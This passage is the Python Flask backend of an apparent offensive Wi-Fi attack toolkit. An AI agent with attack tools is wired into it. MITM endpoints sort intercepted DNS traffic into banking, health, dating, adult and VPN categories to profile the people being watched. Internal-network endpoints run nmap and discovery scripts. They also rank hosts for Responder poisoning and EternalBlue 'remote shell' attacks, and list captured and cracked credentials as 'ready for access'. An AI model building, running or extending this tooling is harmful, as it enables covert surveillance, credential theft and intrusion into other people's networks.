    
    if not new_prompt:
        return jsonify({'success': False, 'error': 'Empty prompt'})
    
    with open(OPERATOR_PROMPT_FILE, 'w') as f:
        f.write(new_prompt)
    
    return jsonify({'success': True, 'message': 'Prompt updated'})


@app.route('/api/operator/prompt/reset', methods=['POST'])
def operator_prompt_reset():
    """Reset to default prompt"""
    if not operator_authenticated:
        return jsonify({'error': 'Not authenticated'}), 401
    
    if os.path.exists(OPERATOR_PROMPT_FILE):
        os.remove(OPERATOR_PROMPT_FILE)
    
    return jsonify({'success': True, 'message': 'Prompt reset to default'})


@app.route('/api/operator/status', methods=['GET'])
def operator_status():
    """Check if Operator is configured"""
    api_key = os.environ.get('ANTHROPIC_API_KEY')
    if not api_key:
        try:
            config_path = '/home/ov3rr1d3/wifi_arsenal/.anthropic_key'
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    api_key = f.read().strip()
        except:
            pass
    
    return jsonify({
        'configured': bool(api_key),
        'conversation_length': len(operator_memory.get('conversation', [])),
        'facts_count': len(operator_memory.get('facts', []))
    })


def get_operator_prompt():
    """Get the current system prompt based on mode - custom file, or default for mode"""
    global operator_mode
    if os.path.exists(OPERATOR_PROMPT_FILE):
        with open(OPERATOR_PROMPT_FILE, 'r') as f:
            return f.read()
    # Return prompt based on mode
    if operator_mode == "chat":
        return OPERATOR_CHAT_PROMPT
    return OPERATOR_SYSTEM_PROMPT


@app.route('/api/operator/chat/stream', methods=['POST'])
def operator_chat_stream():
    """Streaming chat with J4Rv15 - real-time responses and tool visibility"""
    global operator_memory
    
    if not operator_authenticated:
        return jsonify({'success': False, 'error': 'Authentication required. Nice try though.'})
    
    data = request.json or {}
    user_message = data.get('message', '').strip()
    
    if not user_message:
        return jsonify({'success': False, 'error': 'No message provided'})
    
    # Get API key
    api_key = os.environ.get('ANTHROPIC_API_KEY')
    if not api_key:
        try:
            config_path = '/home/ov3rr1d3/wifi_arsenal/.anthropic_key'
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    api_key = f.read().strip()
        except:
            pass
    
    if not api_key:
        return jsonify({'success': False, 'error': 'No API key configured'})
    
    def generate():
        import json as json_module
        
        # Get MCP client and tools based on mode
        try:
            mcp = get_mcp_client()
            all_tools = mcp.get_all_tools()
            if operator_mode == "chat":
                # Chat mode: only arsenal_execute
                mcp_tools = [t for t in all_tools if t["name"] == "wifi_arsenal_arsenal_execute"]
            else:
                # Work mode: all wifi_arsenal tools
                mcp_tools = [t for t in all_tools if t["name"].startswith("wifi_arsenal_")]
        except Exception as e:
            mcp_tools = []
            yield f"data: {json_module.dumps({'type': 'error', 'error': f'MCP error: {e}'})}\n\n"
        
        # Get current system context
        try:
            context_response = operator_context()
            context_data = context_response.get_json()
        except:
            context_data = {'error': 'Could not fetch context'}
        
        # Load project knowledge
        project_knowledge = load_project_knowledge()
        
        # Build system prompt
        full_system = get_operator_prompt() + "\n\n"
        full_system += "PROJECT KNOWLEDGE:\n" + project_knowledge + "\n\n"
        full_system += "CURRENT SYSTEM STATE:\n" + json_module.dumps(context_data, indent=2)
        
        if operator_memory.get('facts'):
            full_system += "\n\nREMEMBERED FACTS ABOUT USER:\n" + "\n".join(operator_memory['facts'])
        
        # Ensure we have an active conversation
        if not operator_memory.get('active_conversation'):
            conv_id = generate_conversation_id()
            operator_memory['conversations'][conv_id] = {
                'id': conv_id,
                'name': 'New conversation',
                'created': datetime.now().isoformat(),
                'updated': datetime.now().isoformat(),
                'messages': []
            }
            operator_memory['active_conversation'] = conv_id
        
        # Add user message to conversation
        conv_messages = get_active_conversation(operator_memory)
        conv_messages.append({
            'role': 'user',
            'content': user_message
        })
        
        # Keep conversation manageable
        if len(conv_messages) > 30:
            conv_messages = conv_messages[-30:]
        
        set_active_conversation_messages(operator_memory, conv_messages)
        save_operator_memory(operator_memory)
        
        yield f"data: {json_module.dumps({'type': 'status', 'status': 'started'})}\n\n"
        
        try:
            client = anthropic.Anthropic(api_key=api_key)
            
            messages = conv_messages.copy()
            max_iterations = 10
            iteration = 0
            full_response = ""
            
            while iteration < max_iterations:
                iteration += 1
                
                yield f"data: {json_module.dumps({'type': 'status', 'status': 'thinking', 'iteration': iteration})}\n\n"
                
                # Make streaming API call
                api_kwargs = {
                    'model': 'claude-sonnet-4-20250514',
                    'max_tokens': 4096,
                    'system': full_system,
                    'messages': messages
                }
                
                if mcp_tools:
                    api_kwargs['tools'] = mcp_tools
                
                current_text = ""
                tool_uses = []
                current_tool_use = None
                
                with client.messages.stream(**api_kwargs) as stream:
                    for event in stream:
                        if event.type == 'content_block_start':
                            if hasattr(event.content_block, 'type'):
                                if event.content_block.type == 'text':
                                    yield f"data: {json_module.dumps({'type': 'text_start'})}\n\n"
                                elif event.content_block.type == 'tool_use':
                                    current_tool_use = {
                                        'id': event.content_block.id,
                                        'name': event.content_block.name,
                                        'input': ''
                                    }
                                    yield f"data: {json_module.dumps({'type': 'tool_start', 'tool': event.content_block.name})}\n\n"
                        
                        elif event.type == 'content_block_delta':
                            if hasattr(event.delta, 'text'):
                                current_text += event.delta.text
                                yield f"data: {json_module.dumps({'type': 'text_delta', 'text': event.delta.text})}\n\n"
                            elif hasattr(event.delta, 'partial_json'):
                                if current_tool_use:
                                    current_tool_use['input'] += event.delta.partial_json
                        
                        elif event.type == 'content_block_stop':
                            if current_tool_use:
                                # Parse the accumulated JSON input
                                try:
                                    current_tool_use['input'] = json_module.loads(current_tool_use['input'])
                                except:
                                    current_tool_use['input'] = {}
                                tool_uses.append(current_tool_use)
                                yield f"data: {json_module.dumps({'type': 'tool_input', 'tool': current_tool_use['name'], 'input': current_tool_use['input']})}\n\n"
                                current_tool_use = None
                        
                        elif event.type == 'message_stop':
                            pass
                    
                    # Get final message info
                    final_message = stream.get_final_message()
                    stop_reason = final_message.stop_reason
                
                # Handle tool use
                if stop_reason == 'tool_use' and tool_uses:
                    tool_results = []
                    
                    # Build assistant content for message history
                    assistant_content = []
                    if current_text:
                        assistant_content.append({'type': 'text', 'text': current_text})
                    for tu in tool_uses:
                        assistant_content.append({
                            'type': 'tool_use',
                            'id': tu['id'],
                            'name': tu['name'],
                            'input': tu['input']
                        })
                    
                    messages.append({'role': 'assistant', 'content': assistant_content})
                    
                    # Execute tools
                    for tu in tool_uses:
                        yield f"data: {json_module.dumps({'type': 'tool_executing', 'tool': tu['name']})}\n\n"
                        
                        try:
                            result = mcp.call_tool(tu['name'], tu['input'])
                            # Truncate long results for display
                            display_result = result[:500] + '...' if len(result) > 500 else result
                            yield f"data: {json_module.dumps({'type': 'tool_result', 'tool': tu['name'], 'result': display_result})}\n\n"
                        except Exception as e:
                            result = f"Tool error: {str(e)}"
                            yield f"data: {json_module.dumps({'type': 'tool_error', 'tool': tu['name'], 'error': str(e)})}\n\n"
                        
                        tool_results.append({
                            'type': 'tool_result',
                            'tool_use_id': tu['id'],
                            'content': result
                        })
                    
                    messages.append({'role': 'user', 'content': tool_results})
                    tool_uses = []
                    
                else:
                    # Final response
                    full_response = current_text
                    break
            
            # Save to memory
            conv_messages = get_active_conversation(operator_memory)
            conv_messages.append({
                'role': 'assistant',
                'content': full_response
            })
            set_active_conversation_messages(operator_memory, conv_messages)
            save_operator_memory(operator_memory)
            
            yield f"data: {json_module.dumps({'type': 'done', 'full_response': full_response})}\n\n"
            
        except Exception as e:
            import traceback
            yield f"data: {json_module.dumps({'type': 'error', 'error': str(e), 'trace': traceback.format_exc()})}\n\n"
    
    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no'
        }
    )


# ========== END OPERATOR ENDPOINTS ==========

# CATCH-ALL ROUTE - MUST BE LAST
@app.route('/<path:path>')
def serve_static(path):
    """Serve any file from web directory"""
    return send_from_directory(WEB_DIR, path)


# ============== MITM ENDPOINTS ==============

@app.route('/api/mitm/dns', methods=['GET'])
def mitm_dns():
    """Get DNS query log with intelligent categorization"""
    dns_log = os.path.join(CAPTURE_DIR, 'dns_queries.log')
    
    # Service detection patterns
    SERVICES = {
        # Social Media
        'facebook': {'icon': '📘', 'name': 'Facebook', 'patterns': ['facebook.com', 'fbcdn.net', 'fb.com', 'fbsbx.com']},
        'instagram': {'icon': '📷', 'name': 'Instagram', 'patterns': ['instagram.com', 'cdninstagram.com']},
        'twitter': {'icon': '🐦', 'name': 'Twitter/X', 'patterns': ['twitter.com', 'twimg.com', 'x.com', 't.co']},
        'tiktok': {'icon': '🎵', 'name': 'TikTok', 'patterns': ['tiktok.com', 'tiktokcdn.com', 'musical.ly']},
        'snapchat': {'icon': '👻', 'name': 'Snapchat', 'patterns': ['snapchat.com', 'snap.com', 'sc-cdn.net']},
        'reddit': {'icon': '🤖', 'name': 'Reddit', 'patterns': ['reddit.com', 'redd.it', 'redditmedia.com']},
        'linkedin': {'icon': '💼', 'name': 'LinkedIn', 'patterns': ['linkedin.com', 'licdn.com']},
        
        # Streaming
        'youtube': {'icon': '▶️', 'name': 'YouTube', 'patterns': ['youtube.com', 'googlevideo.com', 'ytimg.com', 'youtu.be']},
        'netflix': {'icon': '🎬', 'name': 'Netflix', 'patterns': ['netflix.com', 'nflxvideo.net', 'nflximg.net']},
        'spotify': {'icon': '🎧', 'name': 'Spotify', 'patterns': ['spotify.com', 'scdn.co', 'spoti.fi']},
        'hulu': {'icon': '🎬', 'name': 'Hulu', 'patterns': ['hulu.com', 'hulustream.com']},
        'disney': {'icon': '🏰', 'name': 'Disney+', 'patterns': ['disneyplus.com', 'disney-plus.net', 'dssott.com']},
        'hbomax': {'icon': '🎬', 'name': 'HBO Max', 'patterns': ['hbomax.com', 'max.com']},
        'primevideo': {'icon': '🎬', 'name': 'Prime Video', 'patterns': ['primevideo.com', 'atv-ps.amazon.com']},
        
        # Communication
        'gmail': {'icon': '📧', 'name': 'Gmail', 'patterns': ['gmail.com', 'mail.google.com']},
        'outlook': {'icon': '📧', 'name': 'Outlook', 'patterns': ['outlook.com', 'outlook.live.com', 'office365.com', 'office.com', 'hotmail.com']},
        'yahoo': {'icon': '📧', 'name': 'Yahoo Mail', 'patterns': ['mail.yahoo.com', 'ymail.com']},
        'whatsapp': {'icon': '💬', 'name': 'WhatsApp', 'patterns': ['whatsapp.com', 'whatsapp.net']},
        'telegram': {'icon': '💬', 'name': 'Telegram', 'patterns': ['telegram.org', 't.me', 'telegram.me']},
        'signal': {'icon': '💬', 'name': 'Signal', 'patterns': ['signal.org', 'whispersystems.org']},
        'discord': {'icon': '🎮', 'name': 'Discord', 'patterns': ['discord.com', 'discordapp.com', 'discord.gg']},
        
        # Search & Productivity
        'google': {'icon': '🔍', 'name': 'Google', 'patterns': ['google.com', 'googleapis.com', 'gstatic.com']},
        'bing': {'icon': '🔍', 'name': 'Bing', 'patterns': ['bing.com']},
        'duckduckgo': {'icon': '🔍', 'name': 'DuckDuckGo', 'patterns': ['duckduckgo.com', 'ddg.gg']},
        
        # Work Apps
        'slack': {'icon': '💼', 'name': 'Slack', 'patterns': ['slack.com', 'slack-edge.com', 'slack-imgs.com']},
        'zoom': {'icon': '📹', 'name': 'Zoom', 'patterns': ['zoom.us', 'zoom.com', 'zoomgov.com']},
        'teams': {'icon': '💼', 'name': 'MS Teams', 'patterns': ['teams.microsoft.com', 'teams.live.com']},
        'webex': {'icon': '📹', 'name': 'Webex', 'patterns': ['webex.com', 'wbx2.com']},
        'asana': {'icon': '📋', 'name': 'Asana', 'patterns': ['asana.com']},
        'trello': {'icon': '📋', 'name': 'Trello', 'patterns': ['trello.com']},
        'notion': {'icon': '📋', 'name': 'Notion', 'patterns': ['notion.so', 'notion.com']},
        
        # Cloud Storage
        'dropbox': {'icon': '☁️', 'name': 'Dropbox', 'patterns': ['dropbox.com', 'dropboxapi.com']},
        'onedrive': {'icon': '☁️', 'name': 'OneDrive', 'patterns': ['onedrive.live.com', 'onedrive.com', '1drv.com']},
        'gdrive': {'icon': '☁️', 'name': 'Google Drive', 'patterns': ['drive.google.com', 'docs.google.com']},
        'icloud': {'icon': '☁️', 'name': 'iCloud', 'patterns': ['icloud.com']},
        'box': {'icon': '☁️', 'name': 'Box', 'patterns': ['box.com', 'boxcdn.net']},
        
        # Shopping
        'amazon': {'icon': '📦', 'name': 'Amazon', 'patterns': ['amazon.com', 'amazon-adsystem.com']},
        'ebay': {'icon': '🛒', 'name': 'eBay', 'patterns': ['ebay.com', 'ebayimg.com', 'ebaystatic.com']},
        'walmart': {'icon': '🛒', 'name': 'Walmart', 'patterns': ['walmart.com', 'wal.co']},
        'target': {'icon': '🛒', 'name': 'Target', 'patterns': ['target.com']},
        'bestbuy': {'icon': '🛒', 'name': 'Best Buy', 'patterns': ['bestbuy.com']},
        'etsy': {'icon': '🛒', 'name': 'Etsy', 'patterns': ['etsy.com', 'etsystatic.com']},
        'shopify': {'icon': '🛒', 'name': 'Shopify Store', 'patterns': ['myshopify.com', 'shopify.com']},
        
        # Food Delivery
        'doordash': {'icon': '🍔', 'name': 'DoorDash', 'patterns': ['doordash.com']},
        'ubereats': {'icon': '🍔', 'name': 'Uber Eats', 'patterns': ['ubereats.com']},
        'grubhub': {'icon': '🍔', 'name': 'Grubhub', 'patterns': ['grubhub.com']},
        'postmates': {'icon': '🍔', 'name': 'Postmates', 'patterns': ['postmates.com']},
        'instacart': {'icon': '🛒', 'name': 'Instacart', 'patterns': ['instacart.com']},
        
        # Travel
        'airbnb': {'icon': '✈️', 'name': 'Airbnb', 'patterns': ['airbnb.com', 'airbnbcdn.com']},
        'expedia': {'icon': '✈️', 'name': 'Expedia', 'patterns': ['expedia.com']},
        'booking': {'icon': '✈️', 'name': 'Booking.com', 'patterns': ['booking.com', 'bstatic.com']},
        'kayak': {'icon': '✈️', 'name': 'Kayak', 'patterns': ['kayak.com']},
        'tripadvisor': {'icon': '✈️', 'name': 'TripAdvisor', 'patterns': ['tripadvisor.com']},
        'uber': {'icon': '🚗', 'name': 'Uber', 'patterns': ['uber.com']},
        'lyft': {'icon': '🚗', 'name': 'Lyft', 'patterns': ['lyft.com']},
        'delta': {'icon': '✈️', 'name': 'Delta Airlines', 'patterns': ['delta.com']},
        'united': {'icon': '✈️', 'name': 'United Airlines', 'patterns': ['united.com']},
        'southwest': {'icon': '✈️', 'name': 'Southwest', 'patterns': ['southwest.com']},
        'american': {'icon': '✈️', 'name': 'American Airlines', 'patterns': ['aa.com']},
        
        # Banking & Finance
        'banking': {'icon': '🏦', 'name': 'Banking', 'patterns': ['chase.com', 'bankofamerica.com', 'wellsfargo.com', 'citi.com', 'capitalone.com', 'usbank.com', 'pnc.com', 'tdbank.com', 'ally.com', 'schwab.com', 'fidelity.com', 'vanguard.com', 'etrade.com', 'robinhood.com', 'prosperity.bank', 'prosperitybankusa.com', 'fiservapps.com', 'fiserv.com']},
        'paypal': {'icon': '💳', 'name': 'PayPal', 'patterns': ['paypal.com', 'paypalobjects.com']},
        'venmo': {'icon': '💳', 'name': 'Venmo', 'patterns': ['venmo.com']},
        'cashapp': {'icon': '💳', 'name': 'Cash App', 'patterns': ['cash.app', 'squareup.com']},
        'zelle': {'icon': '💳', 'name': 'Zelle', 'patterns': ['zellepay.com']},
        'crypto': {'icon': '₿', 'name': 'Crypto', 'patterns': ['coinbase.com', 'binance.com', 'crypto.com', 'kraken.com', 'gemini.com', 'blockchain.com', 'bitfinex.com', 'kucoin.com']},
        
        # Health & Medical
        'health': {'icon': '💊', 'name': 'Health/Medical', 'patterns': ['mychart.com', 'webmd.com', 'mayoclinic.org', 'cvs.com', 'walgreens.com', 'cigna.com', 'anthem.com', 'uhc.com', 'aetna.com', 'humana.com', 'teladoc.com', 'mdlive.com', 'zocdoc.com', 'healthgrades.com', 'patient.info', 'dexcom.com', 'freestyle.abbott', 'medtronic.com', 'tandemdiabetes.com', 'omnipod.com', 'tdcservices.tandemdiabetes.com']},
        
        # Government
        'government': {'icon': '🏛️', 'name': 'Government', 'patterns': ['.gov', 'irs.gov', 'ssa.gov', 'dmv.', 'usps.com', 'uscis.gov', 'state.gov', 'dhs.gov', 'va.gov']},
        
        # VPN Services (security-aware user)
        'vpn': {'icon': '🔐', 'name': 'VPN Service', 'patterns': ['nordvpn.com', 'expressvpn.com', 'surfshark.com', 'privateinternetaccess.com', 'protonvpn.com', 'mullvad.net', 'tunnelbear.com', 'cyberghost.com', 'ipvanish.com', 'vyprvpn.com']},
        
        # News
        'news': {'icon': '📰', 'name': 'News', 'patterns': ['cnn.com', 'bbc.com', 'nytimes.com', 'foxnews.com', 'reuters.com', 'washingtonpost.com', 'wsj.com', 'nbcnews.com', 'cbsnews.com', 'abcnews.go.com', 'usatoday.com', 'apnews.com', 'theguardian.com', 'huffpost.com', 'buzzfeed.com']},
        
        # Gaming
        'gaming': {'icon': '🎮', 'name': 'Gaming', 'patterns': ['steampowered.com', 'epicgames.com', 'xbox.com', 'playstation.com', 'twitch.tv', 'origin.com', 'ea.com', 'blizzard.com', 'battle.net', 'riotgames.com', 'leagueoflegends.com', 'minecraft.net', 'roblox.com', 'nintendo.com']},
        
        # Dating
        'dating': {'icon': '❤️', 'name': 'Dating', 'patterns': ['tinder.com', 'bumble.com', 'hinge.co', 'match.com', 'okcupid.com', 'grindr.com', 'pof.com', 'eharmony.com', 'zoosk.com', 'coffee-meets-bagel.com', 'hily.com', 'badoo.com']},
        
        # Adult Content
        'adult': {'icon': '🔞', 'name': 'Adult Content', 'patterns': ['pornhub.com', 'xvideos.com', 'xnxx.com', 'xhamster.com', 'onlyfans.com', 'redtube.com', 'youporn.com', 'brazzers.com', 'chaturbate.com', 'stripchat.com', 'cam4.com', 'livejasmin.com', 'fansly.com']},
        
        # Carrier/Phone (background intel)
        'att': {'icon': '📱', 'name': 'AT&T', 'patterns': ['att.com', 'att.net', 'epdg.epc.att.net']},
        'verizon': {'icon': '📱', 'name': 'Verizon', 'patterns': ['verizon.com', 'vzw.com', 'verizonwireless.com']},
        'tmobile': {'icon': '📱', 'name': 'T-Mobile', 'patterns': ['t-mobile.com', 'tmobile.com']},
        'sprint': {'icon': '📱', 'name': 'Sprint', 'patterns': ['sprint.com']},
        
        # Smart Home / IoT (background intel)
        'smarthome': {'icon': '🏠', 'name': 'Smart Home', 'patterns': ['ring.com', 'nest.com', 'wyze.com', 'smartthings.com', 'tuya.com', 'philips-hue.com', 'ecobee.com', 'arlo.com', 'blink.com']},
        
        # Fitness (background intel)
        'fitness': {'icon': '🏃', 'name': 'Fitness', 'patterns': ['fitbit.com', 'garmin.com', 'strava.com', 'myfitnesspal.com', 'peloton.com', 'whoop.com', 'oura.com']},
    }
    
    # System noise to filter out
    NOISE_PATTERNS = [
        'apple.com', 'icloud.com', 'aaplimg.com', 'mzstatic.com',  # Apple system
        'akadns.net', 'akamai.net', 'akamaiedge.net',  # CDN
        'cloudflare', 'fastly',  # CDN
        'crashlytics', 'app-measurement', 'analytics',  # Analytics
        'localhost', '10.0.0.', '192.168.',  # Local
        'arpa', 'local',  # System
        'captive', 'connectivitycheck', 'msftconnecttest',  # Captive portal checks
        'time.', 'ntp.',  # Time sync
        'ocsp.', 'crl.',  # Certificate checks
    ]
    
    if not os.path.exists(dns_log):
        return jsonify({'success': True, 'activity': [], 'services': {}, 'raw_count': 0})
    
    try:
        with open(dns_log, 'r') as f:
            raw = f.read()
        
        # Parse and categorize
        seen_services = {}
        activity = []
        raw_count = 0
        
        for line in raw.strip().split('\n'):
            if 'query[' not in line:
                continue
            raw_count += 1
            
            try:
                parts = line.split('query[')[1]
                query_type = parts.split(']')[0]
                rest = parts.split('] ')[1]
                domain = rest.split(' from ')[0].lower()
                client = rest.split(' from ')[1] if ' from ' in rest else 'unknown'
                timestamp = ' '.join(line.split()[:3])
                
                # Skip noise
                if any(noise in domain for noise in NOISE_PATTERNS):
                    continue
                
                # Skip duplicate query types (A, AAAA, HTTPS for same domain)
                if query_type != 'A':
                    continue
                
                # Identify service
                service_key = None
                for key, svc in SERVICES.items():
                    if any(pattern in domain for pattern in svc['patterns']):
                        service_key = key
                        break
                
                if service_key:
                    svc = SERVICES[service_key]
                    if service_key not in seen_services:
                        seen_services[service_key] = {
                            'icon': svc['icon'],
                            'name': svc['name'],
                            'count': 0,
                            'first_seen': timestamp,
                            'last_seen': timestamp,
                            'client': client
                        }
                    seen_services[service_key]['count'] += 1
                    seen_services[service_key]['last_seen'] = timestamp
                    
                    # Add to activity feed (deduplicate recent)
                    activity_entry = {
                        'timestamp': timestamp,
                        'icon': svc['icon'],
                        'service': svc['name'],
                        'domain': domain,
                        'client': client,
                        'type': 'known'
                    }
                    # Only add if not duplicate of last entry
                    if not activity or activity[-1]['service'] != svc['name']:
                        activity.append(activity_entry)
                else:
                    # Unknown but not noise - might be interesting
                    activity.append({
                        'timestamp': timestamp,
                        'icon': '🌐',
                        'service': 'Website',
                        'domain': domain,
                        'client': client,
                        'type': 'unknown'
                    })
            except:
                pass
        
        # Sort services by count
        sorted_services = dict(sorted(seen_services.items(), key=lambda x: x[1]['count'], reverse=True))
        
        return jsonify({
            'success': True,
            'activity': activity[-50:][::-1],  # Last 50, newest first
            'services': sorted_services,
            'raw_count': raw_count,
            'filtered_count': len(activity)
        })
    except Exception as e:
        return jsonify({'success': False, 'activity': [], 'services': {}, 'raw_count': 0, 'error': str(e)})

@app.route('/api/mitm/dns/clear', methods=['POST'])
def mitm_dns_clear():
    """Clear DNS query log"""
    dns_log = os.path.join(CAPTURE_DIR, 'dns_queries.log')
    try:
        with open(dns_log, 'w') as f:
            f.write('')
        return jsonify({'success': True, 'output': 'DNS log cleared'})
    except Exception as e:
        return jsonify({'success': False, 'output': str(e)})




# ============== INTERNAL NETWORK ATTACK ENDPOINTS ==============

@app.route('/api/internal/discover/start', methods=['POST'])
def internal_discover_start():
    """Start passive network discovery"""
    data = request.json or {}
    interface = data.get('interface', 'alfa0')

    if not re.match(r'^[a-zA-Z0-9]+$', interface):
        return jsonify({'success': False, 'error': 'Invalid interface name'})

    script = os.path.join(SCRIPT_DIR, 'internal', 'start_discover.sh')
    try:
        result = subprocess.run(['bash', script, interface],
                              capture_output=True, text=True, timeout=10)
        success = 'started' in result.stdout.lower()
        return jsonify({
            'success': success,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/discover/stop', methods=['POST'])
def internal_discover_stop():
    """Stop passive discovery"""
    script = os.path.join(SCRIPT_DIR, 'internal', 'stop_discover.sh')
    try:
        result = subprocess.run(['bash', script], 
                              capture_output=True, text=True, timeout=10)
        return jsonify({
            'success': True,
            'output': result.stdout + result.stderr
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/internal/discover/status', methods=['GET'])
def internal_discover_status():
    """Get discovery status"""
    pid_file = '/tmp/discovery_pid.txt'
    running = False
    pid = None
    
    if os.path.exists(pid_file):
        with open(pid_file, 'r') as f:
            pid = f.read().strip()
        try:
            os.kill(int(pid), 0)
            running = True
        except:
            running = False
    
    return jsonify({
        'running': running,
        'pid': pid
    })


@app.route('/api/internal/discover/results', methods=['GET'])
def internal_discover_results():
    """Get discovery results"""
    results_file = os.path.join(CAPTURE_DIR, 'discovery_results.json')
    
    if os.path.exists(results_file):
        try:
            with open(results_file, 'r') as f:
                results = json.load(f)
            return jsonify({
                'success': True,
                'results': results
            })
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    else:
        return jsonify({
            'success': True,
            'results': {
                'hosts': {},
                'vulnerabilities': [],
                'llmnr': [],
                'nbns': [],
                'wpad': [],
                'cleartext': []
            }
        })


@app.route('/api/internal/discover/clear', methods=['POST'])
def internal_discover_clear():
    """Clear discovery results"""
    results_file = os.path.join(CAPTURE_DIR, 'discovery_results.json')
    try:
        if os.path.exists(results_file):
            os.remove(results_file)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


nmap_scan_state = {
    'running': False,
    'subnet': '',
    'started_at': None,
    'error': None
}
nmap_scan_lock = threading.Lock()

def _run_nmap_scan(subnet):
    """Background worker for nmap scan"""
    script = os.path.join(SCRIPT_DIR, 'internal', 'nmap_scan.sh')
    try:
        subprocess.run(['bash', script, subnet],
                      capture_output=True, text=True, timeout=600)
    except subprocess.TimeoutExpired:
        nmap_scan_state['error'] = 'Scan timed out (10 min limit)'
    except Exception as e:
        nmap_scan_state['error'] = str(e)
    finally:
        with nmap_scan_lock:
            nmap_scan_state['running'] = False

@app.route('/api/internal/scan', methods=['POST'])
def internal_scan():
    """Start async nmap scan on subnet"""
    data = request.json or {}
    subnet = data.get('subnet', '192.168.1.0/24')

    if not re.match(r'^[0-9./]+$', subnet):
        return jsonify({'success': False, 'error': 'Invalid subnet format'})

    with nmap_scan_lock:
        if nmap_scan_state['running']:
            return jsonify({'success': False, 'error': 'Scan already running on ' + nmap_scan_state['subnet']})

        nmap_scan_state['running'] = True
        nmap_scan_state['subnet'] = subnet
        nmap_scan_state['started_at'] = time.time()
        nmap_scan_state['error'] = None

    thread = threading.Thread(target=_run_nmap_scan, args=(subnet,), daemon=True)
    thread.start()

    return jsonify({
        'success': True,
        'message': f'Nmap scan started on {subnet}'
    })

@app.route('/api/internal/scan/status', methods=['GET'])
def internal_scan_status():
    """Check nmap scan progress"""
    elapsed = 0
    if nmap_scan_state['started_at']:
        elapsed = int(time.time() - nmap_scan_state['started_at'])

    return jsonify({
        'running': nmap_scan_state['running'],
        'subnet': nmap_scan_state['subnet'],
        'elapsed_seconds': elapsed,
        'error': nmap_scan_state['error']
    })

@app.route('/api/internal/scan/results', methods=['GET'])
def internal_scan_results():
    """Get nmap scan results"""
    results_file = os.path.join(CAPTURE_DIR, 'nmap_results.json')

    if nmap_scan_state['running']:
        return jsonify({'success': False, 'error': 'Scan still running', 'running': True})

    if nmap_scan_state['error']:
        return jsonify({'success': False, 'error': nmap_scan_state['error']})

    if os.path.exists(results_file):
        try:
            with open(results_file, 'r') as f:
                scan_results = json.load(f)
            return jsonify({
                'success': True,
                'results': scan_results
            })
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)})
    else:
        return jsonify({'success': False, 'error': 'No scan results available'})


@app.route('/api/internal/intel', methods=['GET'])
def internal_intel():
    """Get actionable intelligence summary for J4Rv15 and MCP"""
    results_file = os.path.join(CAPTURE_DIR, 'discovery_results.json')
    hash_file = os.path.join(CAPTURE_DIR, 'hashes', 'hashes.json')
    
    # Load discovery results
    discovery = {
        'hosts': {},
        'vulnerabilities': [],
        'llmnr': [],
        'nbns': [],
        'wpad': [],
        'cleartext': [],
        'smb': {}
    }
    
    if os.path.exists(results_file):
        try:
            with open(results_file, 'r') as f:
                discovery = json.load(f)
        except:
            pass
    
    # Load captured hashes
    hashes = []
    if os.path.exists(hash_file):
        try:
            with open(hash_file, 'r') as f:
                hashes = json.load(f)
        except:
            pass
    
    # Build actionable targets
    targets = []
    recommendations = []
    
    # LLMNR/NBT-NS targets (can poison with Responder)
    poisonable_hosts = set()
    for item in discovery.get('llmnr', []):
        poisonable_hosts.add(item.get('source'))
    for item in discovery.get('nbns', []):
        poisonable_hosts.add(item.get('source'))
    for item in discovery.get('wpad', []):
        poisonable_hosts.add(item.get('source'))
    
    for ip in poisonable_hosts:
        targets.append({
            'ip': ip,
            'vuln_type': 'LLMNR/NBT-NS/WPAD',
            'severity': 'high',
            'action': 'responder',
            'description': 'Start Responder to capture NTLMv2 hash'
        })
    
    if poisonable_hosts:
        recommendations.append(f"Start Responder - {len(poisonable_hosts)} host(s) broadcasting poisonable queries")
    
    # SMBv1 targets (EternalBlue)
    for ip, info in discovery.get('smb', {}).items():
        if info.get('version') == 'SMBv1':
            targets.append({
                'ip': ip,
                'vuln_type': 'SMBv1',
                'severity': 'critical',
                'action': 'eternalblue',
                'description': 'Run EternalBlue (MS17-010) for remote shell'
            })
            recommendations.append(f"EternalBlue target found: {ip} has SMBv1 enabled")
    
    # Cleartext credentials (already captured)
    for cred in discovery.get('cleartext', []):
        targets.append({
            'ip': cred.get('source'),
            'vuln_type': 'Cleartext',
            'severity': 'critical',
            'action': 'captured',
            'description': f"Credentials captured: {cred.get('credentials', cred.get('data', 'unknown'))}"
        })
    
    # Cracked hashes
    cracked_creds = []
    pending_hashes = []
    for h in hashes:
        if h.get('cracked_password'):
            cracked_creds.append({
                'user': h.get('user'),
                'domain': h.get('domain'),
                'password': h.get('cracked_password')
            })
        else:
            pending_hashes.append({
                'user': h.get('user'),
                'domain': h.get('domain'),
                'status': h.get('status', 'captured')
            })
    
    if cracked_creds:
        recommendations.append(f"{len(cracked_creds)} credential(s) cracked - ready for access")
    if pending_hashes:
        recommendations.append(f"{len(pending_hashes)} hash(es) pending crack - send to Glass")
    
    # Build summary
    host_count = len(discovery.get('hosts', {}))
    vuln_count = len(targets)
    
    if not targets and not cracked_creds:
        if host_count > 0:
            summary = f"{host_count} host(s) discovered, no vulnerabilities found yet"
        else:
            summary = "No activity detected - is discovery running?"
        attack_ready = False
    else:
        parts = []
        if host_count:
            parts.append(f"{host_count} host(s)")
        if poisonable_hosts:
            parts.append(f"{len(poisonable_hosts)} poisonable")
        smb_v1_count = len([t for t in targets if t['vuln_type'] == 'SMBv1'])
        if smb_v1_count:
            parts.append(f"{smb_v1_count} SMBv1")
        if cracked_creds:
            parts.append(f"{len(cracked_creds)} creds ready")
        summary = ", ".join(parts)
        attack_ready = True
    
    return jsonify({
        'success': True,
        'summary': summary,
        'attack_ready': attack_ready,
        'host_count': host_count,
        'targets': targets,
        'cracked_credentials': cracked_creds,
        'pending_hashes': pending_hashes,
        'recommendations': recommendations,
        'discovery_running': os.path.exists('/tmp/discovery_running'),
        'responder_running': os.path.exists('/tmp/responder_pid.txt')
    })


@app.route('/api/internal/responder/start', methods=['POST'])
